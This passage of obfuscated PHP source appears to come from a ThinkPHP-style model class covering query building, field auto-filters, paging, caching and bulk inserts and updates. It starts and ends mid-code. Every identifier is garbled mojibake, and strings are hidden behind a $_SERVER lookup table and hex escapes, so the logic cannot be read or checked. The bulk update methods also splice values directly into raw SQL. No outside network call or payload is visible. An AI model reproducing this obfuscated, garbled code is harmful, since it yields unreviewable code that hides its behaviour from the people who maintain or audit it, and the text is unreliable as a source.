think_exception(think_lang($ã‡åŒçÆ[348])); } $this->data = $¯¢Â±¶ ; return $this; } public function join($»Á¿¢Àà) { $å–©İ¹· =& $_SERVER[‹è™Ü¸Ñ]; if (is_array($»Á¿¢Àà)) { $this->options[$å–©İ¹·[359]] = $»Á¿¢Àà; } elseif (!empty($»Á¿¢Àà)) { $this->options[$å–©İ¹·[359]][] = $»Á¿¢Àà; } return $this; } public function union($øöïÍÜ‹, $ÀËŒ“–Ü = false) { $ÀâÚÇƒ =& $_SERVER[‹è™Ü¸Ñ]; if (empty($øöïÍÜ‹)) { return $this; } if ($ÀËŒ“–Ü) { $this->options[$ÀâÚÇƒ[423]][$ÀâÚÇƒ[424]] = !0; } if (is_object($øöïÍÜ‹)) { $øöïÍÜ‹ = get_object_vars($øöïÍÜ‹); } if (is_string($øöïÍÜ‹)) { $Ñ¥°¶Àò = $øöïÍÜ‹; } elseif (is_array($øöïÍÜ‹)) { if (isset($øöïÍÜ‹[0])) { $this->options[$ÀâÚÇƒ[423]] = array_merge($this->options[$ÀâÚÇƒ[423]], $øöïÍÜ‹); return $this; } else { $Ñ¥°¶Àò = $øöïÍÜ‹; } } else { think_exception(think_lang($ÀâÚÇƒ[348])); } $this->options[$ÀâÚÇƒ[423]][] = $Ñ¥°¶Àò; return $this; } public function cache($™ÅİÎ = true, $¼šú¨¼õ = null, $Ä¼ê—à­ = '') { $Ì¿¼™ò =& $_SERVER[‹è™Ü¸Ñ]; if (!1 !== $™ÅİÎ) { $this->options[$Ì¿¼™ò[425]] = array($Ì¿¼™ò[97] => $™ÅİÎ, $Ì¿¼™ò[415] => $¼šú¨¼õ, $Ì¿¼™ò[33] => $Ä¼ê—à­); } return $this; } public function field($œœ¿ß‘ş, $’ËŞî²š = false) { $‰Şê’ ‰ =& $_SERVER[‹è™Ü¸Ñ]; if (!0 === $œœ¿ß‘ş) { $†¿õ· = $this->getDbFields(); $œœ¿ß‘ş = $†¿õ· ? $†¿õ· : $‰Şê’ ‰[220]; } elseif ($’ËŞî²š) { if (is_string($œœ¿ß‘ş)) { $œœ¿ß‘ş = explode($‰Şê’ ‰[50], $œœ¿ß‘ş); } $†¿õ· = $this->getDbFields(); $œœ¿ß‘ş = $†¿õ· ? array_diff($†¿õ·, $œœ¿ß‘ş) : $œœ¿ß‘ş; } $this->options[$‰Şê’ ‰[350]] = $œœ¿ß‘ş; return $this; } public function scope($¥ÎÚ¬¼ = '', $ãÙ Í² = NULL) { $ºÈí‡Í¦ =& $_SERVER[‹è™Ü¸Ñ]; if ($ºÈí‡Í¦[12] === $¥ÎÚ¬¼) { if (isset($this->_scope[$ºÈí‡Í¦[37]])) { $¨òÃ£ñá = $this->_scope[$ºÈí‡Í¦[37]]; } else { return $this; } } elseif (is_string($¥ÎÚ¬¼)) { $÷ä›ÄË‹ = explode($ºÈí‡Í¦[50], $¥ÎÚ¬¼); $¨òÃ£ñá = array(); foreach ($÷ä›ÄË‹ as $ùÂÚœ•) { if (!isset($this->_scope[$ùÂÚœ•])) { continue; } $¨òÃ£ñá = array_merge($¨òÃ£ñá, $this->_scope[$ùÂÚœ•]); } if (!empty($ãÙ Í²) && is_array($ãÙ Í²)) { $¨òÃ£ñá = array_merge($¨òÃ£ñá, $ãÙ Í²); } } elseif (is_array($¥ÎÚ¬¼)) { $¨òÃ£ñá = $¥ÎÚ¬¼; } if (is_array($¨òÃ£ñá) && !empty($¨òÃ£ñá)) { $this->options = array_merge($this->options, array_change_key_case($¨òÃ£ñá)); } return $this; } public function where($Å˜‡ºÕ›, $©¬ÂØ·ê = null) { $ùœ™¸Ú =& $_SERVER[‹è™Ü¸Ñ]; if (!is_null($©¬ÂØ·ê) && is_string($Å˜‡ºÕ›)) { if (!is_array($©¬ÂØ·ê)) { $©¬ÂØ·ê = func_get_args(); array_shift($©¬ÂØ·ê); } $©¬ÂØ·ê = array_map(array($this->db, $ùœ™¸Ú[419]), $©¬ÂØ·ê); $Å˜‡ºÕ› = vsprintf($Å˜‡ºÕ›, $©¬ÂØ·ê); } elseif (is_object($Å˜‡ºÕ›)) { $Å˜‡ºÕ› = get_object_vars($Å˜‡ºÕ›); } elseif (is_array($Å˜‡ºÕ›)) { foreach ($Å˜‡ºÕ› as $ö™‹˜†Õ => $¶¿Ãî²ó) { if ((is_numeric($ö™‹˜†Õ) || !$ö™‹˜†Õ) && is_string($¶¿Ãî²ó)) { if (strpos($¶¿Ãî²ó, $ùœ™¸Ú[426]) === 0) { continue; } think_trace($ùœ™¸Ú[427], $ùœ™¸Ú[12], $ùœ™¸Ú[49]); die; } } } if (is_string($Å˜‡ºÕ›) && $ùœ™¸Ú[12] != $Å˜‡ºÕ›) { $¦ë—ËÏœ = array(); $¦ë—ËÏœ[$ùœ™¸Ú[428]] = $Å˜‡ºÕ›; $Å˜‡ºÕ› = $¦ë—ËÏœ; } if (isset($this->options[$ùœ™¸Ú[352]])) { $this->options[$ùœ™¸Ú[352]] = array_merge($this->options[$ùœ™¸Ú[352]], $Å˜‡ºÕ›); } else { $this->options[$ùœ™¸Ú[352]] = $Å˜‡ºÕ›; } return $this; } public function limit($ª§ûòãŠ, $ƒØúèß« = null) { $›÷õƒ =& $_SERVER[‹è™Ü¸Ñ]; $this->options[$›÷õƒ[368]] = is_null($ƒØúèß«) ? $ª§ûòãŠ : $ª§ûòãŠ . $›÷õƒ[50] . $ƒØúèß«; return $this; } public function page($¸şüÒÛ, $—ŸÎ°’Ë = null) { $ÖÉ‡ò¬š =& $_SERVER[‹è™Ü¸Ñ]; $this->options[$ÖÉ‡ò¬š[429]] = is_null($—ŸÎ°’Ë) ? $¸şüÒÛ : $¸şüÒÛ . $ÖÉ‡ò¬š[50] . $—ŸÎ°’Ë; return $this; } public function comment($Ş³õş²ô) { $this->options[$_SERVER[‹è™Ü¸Ñ][430]] = $Ş³õş²ô; return $this; } public function setProperty($à™ğÂú, $óéñÁ) { if (property_exists($this, $à™ğÂú)) { $this->{$à™ğÂú} = $óéñÁ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\x66\171\x54\x69\x6d\x65", "\164\151\x6d\x65", "\x69\x6e\163\145\162\164\x2c\165\160\x64\141\164\x65", "\x66\x75\156\x63\x74\x69\157\x6e"), array("\143\162\145\141\164\145\x54\151\155\x65", "\x74\x69\x6d\x65", "\151\x6e\x73\145\162\x74", "\x66\165\x6e\143\164\x69\157\156")); public function setDataAuto($ˆ¹äÂ£Ó) { $this->dataAuto = $ˆ¹äÂ£Ó; } public function __construct($ßï‚¹¿â = '', $õ¿Ò•ñ = '', $ãÓÆÛô¥ = '') { parent::__construct($ßï‚¹¿â, $õ¿Ò•ñ, $ãÓÆÛô¥); } protected $tableMeta = array(); protected function _beforeInsert(&$¤ûÕÊ½‡, $Õõ¸óªå) { $ÊèıØŸÕ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->checkDataAutoHas($ÊèıØŸÕ[431])) { return; } $this->dataBeforeFilter($¤ûÕÊ½‡, $ÊèıØŸÕ[431]); } protected function _beforeUpdate(&$¦á¯…Î™, $’ù…¥ÁÈ) { $ú×¥¤® =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->checkDataAutoHas($ú×¥¤®[432])) { return; } $this->dataBeforeFilter($¦á¯…Î™, $ú×¥¤®[432]); } protected function _afterSelect(&$ì«´¢ç, $ÉÉñ ·’) { if (!is_array($ì«´¢ç)) { return; } if (!$this->checkDataAutoHas($_SERVER[‹è™Ü¸Ñ][433])) { return; } foreach ($ì«´¢ç as &$Ô©Äåêı) { $this->dataAfterFilter($Ô©Äåêı); } unset($Ô©Äåêı); } protected function _afterFind(&$»¯ú¶İ, $­øñºßÛ) { if (!is_array($»¯ú¶İ)) { return; } if (!$this->checkDataAutoHas($_SERVER[‹è™Ü¸Ñ][433])) { return; } $this->dataAfterFilter($»¯ú¶İ); } public static function textEncode($ ÊˆöèÑ) { if (!$ ÊˆöèÑ) { return $ ÊˆöèÑ; } $³Åó•¯ = json_encode($ ÊˆöèÑ); $³Åó•¯ = preg_replace_callback($_SERVER[‹è™Ü¸Ñ][434], function ($çÜÒ„íÎ) { return addslashes($çÜÒ„íÎ[0]); }, $³Åó•¯); return json_decode($³Åó•¯); } public static function textDecode($«ûéìÑã) { $ìÊªİ£ =& $_SERVER[‹è™Ü¸Ñ]; $Üæ¿ñÈé = json_encode($«ûéìÑã); $Üæ¿ñÈé = preg_replace_callback($ìÊªİ£[435], function ($ìğ¤ğŠÎ) { return $_SERVER[‹è™Ü¸Ñ][100]; }, $Üæ¿ñÈé); return json_decode($Üæ¿ñÈé); } public function setAutoIncrement($…µñüå) { $ìÅş¿Øœ = array($this->getPk() => $…µñüå); $Ê›£ËË™ = $this->data($ìÅş¿Øœ)->add(); if ($Ê›£ËË™) { $this->delete($Ê›£ËË™); } } public function getAutoIncrement() { $ª„Ÿ§Óµ = $this->getTableName(); $¯ÏÊ„Æá = $this->max($this->getPk()); $èÎüê‹â = $this->query("\x73\x68\x6f\x77\40\x74\x61\142\154\x65\40\163\x74\141\164\x75\163\40\x77\150\145\x72\x65\x20\x4e\x61\155\x65\x3d\47{$ª„Ÿ§Óµ}\x27"); $ëí®ø¾’ = $èÎüê‹â[0][$_SERVER[‹è™Ü¸Ñ][436]]; $†™ä€ = max($¯ÏÊ„Æá, $ëí®ø¾’); return $†™ä€; } protected function _callBefore($õ·ñüé, $µòœô›¬) { return $this->cacheCallCheck($õ·ñüé, $µòœô›¬, !1); } protected function _callAfter($–ëŸù”, $®†³´»Á) { return $this->cacheCallCheck($–ëŸù”, $®†³´»Á, !0); } protected function cacheFunctionAlias($áıªñï¯) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($„èÑóäç, $œÓ¹·‡ß, $·äæ¨Ã = false) { $Ğíø¯Ô§ = $this->cacheFunctionAlias($œÓ¹·‡ß); if (!$Ğíø¯Ô§) { return; } foreach ($Ğíø¯Ô§ as $ã¾Ÿ’™® => $‹¦³†Å) { $ÑÓÏ®Ğ³ = $‹¦³†Å[0]; $…˜œÔ… = explode($_SERVER[‹è™Ü¸Ñ][50], $‹¦³†Å[1]); if ($„èÑóäç == $ã¾Ÿ’™®) { return $this->cacheFunctionGet($ã¾Ÿ’™®, $ÑÓÏ®Ğ³); } if ($·äæ¨Ã && in_array($„èÑóäç, $…˜œÔ…)) { $this->cacheFunctionClear($ã¾Ÿ’™®, $ÑÓÏ®Ğ³); } } } public function cacheFunctionGet($‹ĞÁÈËã, $šâß·Í©) { $àáéû“ç = $this->cacheKeyMake($‹ĞÁÈËã, $šâß·Í©); $Ğ©™’ô = Cache::get($àáéû“ç); if (!is_array($Ğ©™’ô)) { $Ğ©™’ô = call_user_func_array(array($this, $‹ĞÁÈËã), array($šâß·Í©, !0)); Cache::set($àáéû“ç, $Ğ©™’ô); } return $Ğ©™’ô; } public function cacheFunctionClear($¿Í–Ó”½, $¹É´Õ„—) { $¬ôì°› = $¹É´Õ„—; if (!is_array($¹É´Õ„—)) { $¬ôì°› = array($¹É´Õ„—); } foreach ($¬ôì°› as $µ©¡Ê) { $«µÁùó = $this->cacheKeyMake($¿Í–Ó”½, $µ©¡Ê); Cache::remove($«µÁùó); } } private function cacheKeyMake($Ê€¸¿Ä€, $¾¢ÌÏÊ) { $ƒÃ£¢„ =& $_SERVER[‹è™Ü¸Ñ]; return get_class($this) . $ƒÃ£¢„[11] . $Ê€¸¿Ä€ . $ƒÃ£¢„[437] . $¾¢ÌÏÊ; } protected function selectPageReset() { $üµõáºŸ =& $_SERVER[‹è™Ü¸Ñ]; if (isset($GLOBALS[$üµõáºŸ[438]])) { return; } $GLOBALS[$üµõáºŸ[438]] = isset($GLOBALS[$üµõáºŸ[7]][$üµõáºŸ[439]]) ? $GLOBALS[$üµõáºŸ[7]][$üµõáºŸ[439]] : !1; $GLOBALS[$üµõáºŸ[440]] = isset($GLOBALS[$üµõáºŸ[7]][$üµõáºŸ[429]]) ? $GLOBALS[$üµõáºŸ[7]][$üµõáºŸ[429]] : !1; $GLOBALS[$üµõáºŸ[7]][$üµõáºŸ[439]] = !1; $GLOBALS[$üµõáºŸ[7]][$üµõáºŸ[429]] = !1; } protected function selectPageRestore() { $úñ•ƒ‡× =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($GLOBALS[$úñ•ƒ‡×[438]])) { return; } $GLOBALS[$úñ•ƒ‡×[7]][$úñ•ƒ‡×[439]] = $GLOBALS[$úñ•ƒ‡×[438]]; $GLOBALS[$úñ•ƒ‡×[7]][$úñ•ƒ‡×[429]] = $GLOBALS[$úñ•ƒ‡×[440]]; if ($GLOBALS[$úñ•ƒ‡×[7]][$úñ•ƒ‡×[439]] === !1) { unset($GLOBALS[$úñ•ƒ‡×[7]][$úñ•ƒ‡×[439]]); } if ($GLOBALS[$úñ•ƒ‡×[7]][$úñ•ƒ‡×[429]] === !1) { unset($GLOBALS[$úñ•ƒ‡×[7]][$úñ•ƒ‡×[429]]); } unset($GLOBALS[$úñ•ƒ‡×[438]]); unset($GLOBALS[$úñ•ƒ‡×[440]]); } protected function selectPage($²Ş¯Š˜ = 200, $ô´£…¨ = 1) { $ìÊŞ“ =& $_SERVER[‹è™Ü¸Ñ]; global $in; $¦¼±É = $this->optionsValue(); $’Î‰ŸÒ… = 50000; $²Ş¯Š˜ = isset($in[$ìÊŞ“[439]]) && $in[$ìÊŞ“[439]] ? $in[$ìÊŞ“[439]] : $²Ş¯Š˜; if ($²Ş¯Š˜ === -1) { $in[$ìÊŞ“[439]] = !1; $’Î‰ŸÒ… = 100000000; $²Ş¯Š˜ = $’Î‰ŸÒ…; } $µÚ‰ÂÏ = $¦¼±É; $µÚ‰ÂÏ[$ìÊŞ“[441]] = array(); $²Ş¯Š˜ = intval($²Ş¯Š˜); $²Ş¯Š˜ = $²Ş¯Š˜ <= 5 ? 5 : ($²Ş¯Š˜ >= $’Î‰ŸÒ… ? $’Î‰ŸÒ… : $²Ş¯Š˜); $ô´£…¨ = intval(isset($in[$ìÊŞ“[429]]) && $in[$ìÊŞ“[429]] ? $in[$ìÊŞ“[429]] : $ô´£…¨); $ô´£…¨ = $ô´£…¨ <= 1 ? 1 : $ô´£…¨; $÷Ã¦óÙø = array(); $¥Ÿ¿ÅÈ“ = 1; if ($ô´£…¨ == 1 && $¥Ÿ¿ÅÈ“) { $this->optionsValue($¦¼±É); $÷Ã¦óÙø = $this->page($ô´£…¨, $²Ş¯Š˜)->select(); $ÌªÍô† = is_array($÷Ã¦óÙø) ? count($÷Ã¦óÙø) : 0; if ($ÌªÍô† < $²Ş¯Š˜) { $ÚÄ¢­ô  = 1; } else { $this->optionsValue($µÚ‰ÂÏ); $ÌªÍô† = intval($this->count()); $ÚÄ¢­ô  = ceil($ÌªÍô† / $²Ş¯Š˜); } } else { $this->optionsValue($µÚ‰ÂÏ); $ÌªÍô† = intval($this->count()); $ÚÄ¢­ô  = ceil($ÌªÍô† / $²Ş¯Š˜); $ô´£…¨ = $ô´£…¨ >= $ÚÄ¢­ô  ? $ÚÄ¢­ô  : $ô´£…¨; $this->optionsValue($¦¼±É); $÷Ã¦óÙø = $this->page($ô´£…¨, $²Ş¯Š˜)->select(); } if (!is_array($÷Ã¦óÙø)) { $÷Ã¦óÙø = array(); } if ($ÚÄ¢­ô  == 1) { $ÌªÍô† = count($÷Ã¦óÙø); } $»¶ş«Öƒ = array($ìÊŞ“[442] => array($ìÊŞ“[443] => $ÌªÍô†, $ìÊŞ“[439] => $²Ş¯Š˜, $ìÊŞ“[429] => $ô´£…¨, $ìÊŞ“[444] => $ÚÄ¢­ô ), $ìÊŞ“[445] => $÷Ã¦óÙø); return $»¶ş«Öƒ; } protected function checkLength($††¢®À, $³›¸¬÷è = 0, $Û‡ñšù = '') { $äªÖ©ƒí =& $_SERVER[‹è™Ü¸Ñ]; $³›¸¬÷è = $³›¸¬÷è ? $³›¸¬÷è : 65536; if (!$††¢®À || strlen($††¢®À) < $³›¸¬÷è) { return; } $Û‡ñšù = $Û‡ñšù ? $Û‡ñšù . $äªÖ©ƒí[74] : $äªÖ©ƒí[12]; show_json($Û‡ñšù . LNG($äªÖ©ƒí[446]) . "\x28{$³›¸¬÷è}\51", !1); } protected function metaSet($Ë†ùî„°, $áëğéŒš = null, $ŞØÆì³ = null) { $´ŞÕ«Ÿ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->tableMeta || !$Ë†ùî„°) { return !1; } $æñº«šï = $this->tableMeta[$´ŞÕ«Ÿ[447]]; $ûÊ´§½½ = $this->tableMeta[$´ŞÕ«Ÿ[448]]; $îãŠ¿Õª = Model($ûÊ´§½½); $ÇÓ„æı = array($æñº«šï => $Ë†ùî„°, $´ŞÕ«Ÿ[449] => $áëğéŒš); if (is_null($áëğéŒš)) { return $îãŠ¿Õª->where(array($æñº«šï => $Ë†ùî„°))->delete(); } if (is_null($ŞØÆì³) && is_string($áëğéŒš)) { return $îãŠ¿Õª->where($ÇÓ„æı)->delete(); } $Šá‚‹ó“ = is_array($áëğéŒš) ? $áëğéŒš : array(); if (is_string($áëğéŒš)) { $Šá‚‹ó“[$áëğéŒš] = $ŞØÆì³; } $¶‚¥–Ø´ = array(); foreach ($Šá‚‹ó“ as $ş»í¯­¥ => $Ÿ‰Âõƒ‹) { if (is_null($Ÿ‰Âõƒ‹) && is_string($ş»í¯­¥)) { $îãŠ¿Õª->where(array($æñº«šï => $Ë†ùî„°, $´ŞÕ«Ÿ[449] => $ş»í¯­¥))->delete(); continue; } $this->checkLength($Ÿ‰Âõƒ‹, !1, $ûÊ´§½½ . $´ŞÕ«Ÿ[4] . $ş»í¯­¥); $¶‚¥–Ø´[] = array($æñº«šï => $Ë†ùî„°, $´ŞÕ«Ÿ[97] => $ş»í¯­¥, $´ŞÕ«Ÿ[450] => $Ÿ‰Âõƒ‹); } $’¯—ŸËô = $´ŞÕ«Ÿ[451] . $ûÊ´§½½; CacheLock::lock($’¯—ŸËô); $îãŠ¿Õª->where(array($æñº«šï => $Ë†ùî„°))->addAll($¶‚¥–Ø´, array(), !0); CacheLock::unlock($’¯—ŸËô); return !0; } public function metaGet($¥ŸÌÙøø, $“´÷É Ü = false) { $Ô×›“å» =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->tableMeta) { return array(); } $ÑÓç§òº = $this->tableMeta[$Ô×›“å»[447]]; $¥ï‡Åš— = Model($this->tableMeta[$Ô×›“å»[448]]); if ($“´÷É Ü) { $¶¼úÆ‡Ğ = array($ÑÓç§òº => $¥ŸÌÙøø, $Ô×›“å»[97] => $“´÷É Ü); return $¥ï‡Åš—->where($¶¼úÆ‡Ğ)->getField($Ô×›“å»[450]); } $¶¼úÆ‡Ğ = array($ÑÓç§òº => $¥ŸÌÙøø); $ûÍ³Ğş = $¥ï‡Åš—->field($Ô×›“å»[452])->where($¶¼úÆ‡Ğ)->select(); $ûÍ³Ğş = array_to_keyvalue($ûÍ³Ğş, $Ô×›“å»[97], $Ô×›“å»[450]); return $ûÍ³Ğş; } private function checkDataAutoHas($äÜåøíà) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $‘İ±ÈœÉ) { if (in_array($äÜåøíà, explode($_SERVER[‹è™Ü¸Ñ][50], $‘İ±ÈœÉ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Ì¿˜Ô, $‘Ÿ¿÷ºÒ) { $Èßš’ =& $_SERVER[‹è™Ü¸Ñ]; if (!is_array($Ì¿˜Ô)) { return; } foreach ($this->dataAuto as $æÇ™…Ÿê) { $Ù»úòû = $æÇ™…Ÿê[0]; if (!in_array($‘Ÿ¿÷ºÒ, explode($Èßš’[50], $æÇ™…Ÿê[2]))) { continue; } switch (trim($æÇ™…Ÿê[3])) { case $Èßš’[397]: case $Èßš’[398]: $×ĞüÅ¶¡ = $æÇ™…Ÿê[1]; $±¤‡¾§Â = isset($æÇ™…Ÿê[4]) ? (array) $æÇ™…Ÿê[4] : array(); if ($×ĞüÅ¶¡ == $Èßš’[206] && array_key_exists($Ù»úòû, $Ì¿˜Ô)) { if (!$Ì¿˜Ô[$Ù»úòû]) { unset($Ì¿˜Ô[$Ù»úòû]); } break; } if (isset($Ì¿˜Ô[$Ù»úòû])) { array_unshift($±¤‡¾§Â, $Ì¿˜Ô[$Ù»úòû]); } if ($Èßš’[397] == $æÇ™…Ÿê[3]) { $Ì¿˜Ô[$Ù»úòû] = call_user_func_array($×ĞüÅ¶¡, $±¤‡¾§Â); } else { $Ì¿˜Ô[$Ù»úòû] = call_user_func_array(array(&$this, $×ĞüÅ¶¡), $±¤‡¾§Â); } break; case $Èßš’[347]: if (isset($Ì¿˜Ô[$Ù»úòû]) && $Ì¿˜Ô[$Ù»úòû]) { $Ì¿˜Ô[$Ù»úòû] = call_user_func_array(array(&$this, $æÇ™…Ÿê[1]), array($Ì¿˜Ô[$Ù»úòû])); } break; case $Èßš’[350]: $Ì¿˜Ô[$Ù»úòû] = $Ì¿˜Ô[$æÇ™…Ÿê[1]]; break; case $Èßš’[370]: if (isset($Ì¿˜Ô[$Ù»úòû]) && !is_string($Ì¿˜Ô[$Ù»úòû])) { $Ì¿˜Ô[$Ù»úòû] = json_encode_force($Ì¿˜Ô[$Ù»úòû]); } break; case $Èßš’[399]: if ($Ì¿˜Ô[$Ù»úòû] === $Èßš’[12]) { unset($Ì¿˜Ô[$Ù»úòû]); } break; case $Èßš’[400]: $Ì¿˜Ô[$Ù»úòû] = $æÇ™…Ÿê[1]; default: break; } } if ($‘Ÿ¿÷ºÒ == $Èßš’[431]) { $ÉÍÍášè = strtolower($this->db->getDbType()); if (strpos($ÉÍÍášè, $Èßš’[13]) !== 0) { return; } $ñ—ªêªæ = $this->field(!0)->fields; $¢Ù¶¬Ú = $ñ—ªêªæ[$Èßš’[329]]; if (isset($ñ—ªêªæ[$Èßš’[328]])) { unset($¢Ù¶¬Ú[$ñ—ªêªæ[$Èßš’[328]]]); } foreach ($¢Ù¶¬Ú as $ùú¦é†½ => $‘Ÿ¿÷ºÒ) { if (!isset($Ì¿˜Ô[$ùú¦é†½])) { $Ì¿˜Ô[$ùú¦é†½] = $Èßš’[12]; } } } } private function dataAfterFilter(&$óè¶Ø) { $¶ÔÛ–µí =& $_SERVER[‹è™Ü¸Ñ]; foreach ($this->dataAuto as $òÑÎáèé) { $øû‡íœ = $òÑÎáèé[0]; if (!isset($óè¶Ø[$øû‡íœ])) { continue; } if (!in_array($¶ÔÛ–µí[433], explode($¶ÔÛ–µí[50], $òÑÎáèé[2]))) { continue; } switch (trim($òÑÎáèé[3])) { case $¶ÔÛ–µí[397]: case $¶ÔÛ–µí[398]: $Æ„§‚ñ = isset($òÑÎáèé[4]) ? (array) $òÑÎáèé[4] : array(); array_unshift($Æ„§‚ñ, $óè¶Ø[$øû‡íœ]); if (isset($òÑÎáèé[4]) && $òÑÎáèé[4] == $¶ÔÛ–µí[453]) { $Æ„§‚ñ = array($óè¶Ø[$øû‡íœ]); } if ($¶ÔÛ–µí[397] == $òÑÎáèé[3]) { $óè¶Ø[$øû‡íœ] = call_user_func_array($òÑÎáèé[1], $Æ„§‚ñ); } else { $óè¶Ø[$øû‡íœ] = call_user_func_array(array(&$this, $òÑÎáèé[1]), $Æ„§‚ñ); } break; case $¶ÔÛ–µí[347]: if (isset($óè¶Ø[$øû‡íœ]) && $óè¶Ø[$øû‡íœ]) { $óè¶Ø[$øû‡íœ] = call_user_func_array(array(&$this, $òÑÎáèé[1]), array($óè¶Ø[$øû‡íœ])); } break; case $¶ÔÛ–µí[350]: $óè¶Ø[$øû‡íœ] = $óè¶Ø[$òÑÎáèé[1]]; break; case $¶ÔÛ–µí[370]: $í ƒŸÔğ = $óè¶Ø[$øû‡íœ]; $óè¶Ø[$øû‡íœ] = json_decode($í ƒŸÔğ, !0); if (is_null($óè¶Ø[$øû‡íœ])) { $óè¶Ø[$øû‡íœ] = $í ƒŸÔğ; } break; case $¶ÔÛ–µí[399]: if ($óè¶Ø[$øû‡íœ] === $¶ÔÛ–µí[12]) { unset($óè¶Ø[$øû‡íœ]); } break; case $¶ÔÛ–µí[400]: $óè¶Ø[$øû‡íœ] = $òÑÎáèé[1]; break; default: break; } } } public function saveAll($õ… ö¦è) { $¤ƒÉ¿¤ =& $_SERVER[‹è™Ü¸Ñ]; $±üÇ‡×‚ = $this->tablePrefix . $this->tableName; $·†È­ª = self::SQL_WHERE_IN_CHUNK; $õ… ö¦è = is_array($õ… ö¦è) ? $õ… ö¦è : array(); $œøÛ™‚ = $¤ƒÉ¿¤[454]; $’Û€ÎÃß = 0; $Ã™Ø®ŸÍ = array(); $ˆ–çìƒ = count($õ… ö¦è); for ($›áƒ‚×Ğ = 0; $›áƒ‚×Ğ < $ˆ–çìƒ; $›áƒ‚×Ğ++) { $££ğÀı = $õ… ö¦è[$›áƒ‚×Ğ]; if (!is_array($££ğÀı) || count($££ğÀı) != 4) { continue; } $¹íÛ¬ƒ¾ = "\x55\x50\104\x41\x54\105\40\140{$±üÇ‡×‚}\x60\x20\123\x45\124\x20{$££ğÀı[2]}\40\x3d\40\103\101\123\105\40{$££ğÀı[0]}\x20\xa"; if ($’Û€ÎÃß == 0) { $œøÛ™‚ = $¹íÛ¬ƒ¾; } $Ã™Ø®ŸÍ[] = $¤ƒÉ¿¤[121] . $££ğÀı[1] . $¤ƒÉ¿¤[121]; $’Û€ÎÃß++; $œøÛ™‚ .= "\40\127\x48\105\x4e\40\x27{$££ğÀı[1]}\x27\x20\124\x48\105\116\40\47{$££ğÀı[3]}\47\x20\xa"; if ($’Û€ÎÃß == $·†È­ª || $›áƒ‚×Ğ == $ˆ–çìƒ - 1) { $’¢ãø¯Š = implode($¤ƒÉ¿¤[50], $Ã™Ø®ŸÍ); $œøÛ™‚ .= "\x20\105\x4e\104\x20\x20\127\x48\x45\122\105\40{$££ğÀı[0]}\x20\x49\116\40\50{$’¢ãø¯Š}\x29\40"; $this->execute($œøÛ™‚); $’Û€ÎÃß = 0; $œøÛ™‚ = $¹íÛ¬ƒ¾; $this->chunkEventCheck(count($Ã™Ø®ŸÍ)); $Ã™Ø®ŸÍ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ÇÚåõº€) { $…¦¯µ­¿ =& $_SERVER[‹è™Ü¸Ñ]; $“ŸÄéî½ = $this->tablePrefix . $this->tableName; foreach ($ÇÚåõº€ as $¹´î‚¸í) { if (!is_array($¹´î‚¸í) || count($¹´î‚¸í) != 4) { continue; } $¥Æ×í·÷ = $¹´î‚¸í[0] . $…¦¯µ­¿[455] . $¹´î‚¸í[1] . $…¦¯µ­¿[121]; $¾†ú¬®® = $¹´î‚¸í[2] . $…¦¯µ­¿[455] . $¹´î‚¸í[3] . $…¦¯µ­¿[121]; $ÆÀ¦í¾± = "\165\160\x64\x61\164\x65\40{$“ŸÄéî½}\40\163\145\164\x20{$¾†ú¬®®}\x20\167\150\x65\162\x65\40{$¥Æ×í·÷}\x3b"; $this->execute($ÆÀ¦í¾±); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Œ¡„½”î = false, $Ü›Óü÷ß = false) { $this->_chunkEvent = $Œ¡„½”î; $this->_chunkEventParam = $Ü›Óü÷ß; } private function chunkEventCheck($µö¨ÈÛ) { if (!$this->_chunkEvent) { return; } $÷’ßŞ× = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $÷’ßŞ×[$_SERVER[‹è™Ü¸Ñ][456]] = $µö¨ÈÛ; Hook::trigger($this->_chunkEvent, $÷’ßŞ×); } public function addAll($Ö—ÙÇû€, $üõšî‘Æ = array(), $§½¤åœƒ = false) { $Ñ§¨ù¡ =& $_SERVER[‹è™Ü¸Ñ]; ignore_timeout(); $šÔ€û¯¼ = self::SQL_WHERE_IN_CHUNK; if (empty($Ö—ÙÇû€)) { $this->error = think_lang($Ñ§¨ù¡[348]); return !1; } $üõšî‘Æ = $this->_parseOptions($üõšî‘Æ); foreach ($Ö—ÙÇû€ as $ÈÀ…úƒâ => $´Ö‡¼›å) { $Ö—ÙÇû€[$ÈÀ…úƒâ] = $this->_facade($´Ö‡¼›å); $this->_beforeInsert($Ö—ÙÇû€[$ÈÀ…úƒâ], $üõšî‘Æ); } if (method_exists($this->db, $Ñ§¨ù¡[349])) { for ($ ø¥“Şà = 0; $ ø¥“Şà < count($Ö—ÙÇû€); $ ø¥“Şà += $šÔ€û¯¼) { $™€øš«Ò = array_slice($Ö—ÙÇû€, $ ø¥“Şà, $šÔ€û¯¼); if (!is_array($™€øš«Ò) || count($™€øš«Ò) == 0) { break; } $ö¸¦½ğ = $this->db->insertAll($™€øš«Ò, $üõšî‘Æ, $§½¤åœƒ); $this->chunkEventCheck(count($™€øš«Ò)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Ö—ÙÇû€ as $ÈÀ…úƒâ => $´Ö‡¼›å) { $ö¸¦½ğ = $this->db->insert($´Ö‡¼›å, $üõšî‘Æ, $§½¤åœƒ); } $this->commit(); } if (!1 !== $ö¸¦½ğ) { $…¸Æ¾ = $this->getLastInsID(); if ($…¸Æ¾) { return $…¸Æ¾; } } return $ö¸¦½ğ; } public function save($Æç›Ôã = '', $Å˜ò§„ß = array()) { $½²‹¸ƒ¾ =& $_SERVER[‹è™Ü¸Ñ]; $ÎÂ¾™Ô = self::SQL_WHERE_IN_CHUNK; $ò¥²î©Å = $this->optionsValue(); $¶°·÷» = $this->findWhereField($ò¥²î©Å); if (!$¶°·÷») { return parent::save($Æç›Ôã, $Å˜ò§„ß); } $¯ª±èŸ = 0; $„÷ƒ¤Ä = 